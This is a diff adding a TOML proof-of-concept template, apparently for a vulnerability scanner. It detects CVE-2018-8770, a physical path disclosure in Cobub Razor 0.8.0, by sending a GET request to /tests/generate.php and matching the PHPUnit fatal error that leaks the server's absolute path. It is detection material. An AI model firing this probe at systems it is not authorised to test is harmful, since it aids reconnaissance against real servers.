@@ -1,0 +1,35 @@
+[info]
+author = "AVE"
+description = "检测 Western Bridge Cobub Razor 0.8.0 物理路径泄露漏洞。向 /tests/generate.php 发送 GET 请求，触发 PHPUnit_Framework_TestCase 类未找到的致命错误，响应中会泄露服务器绝对路径。"
+id = "POC-AVE-2018-0216"
+name = "Cobub Razor 0.8.0 Physical Path Leakage PoC"
+severity = "medium"
+tags = [
+    "cve-2018-8770",
+    "cobub",
+    "razor",
+    "path-leakage",
+]
+vuln_id = [
+    "CVE-2018-8770",
+    "AVE-2018-0216",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/tests/generate.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["Fatal error: Class 'PHPUnit_Framework_TestCase' not found in"]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
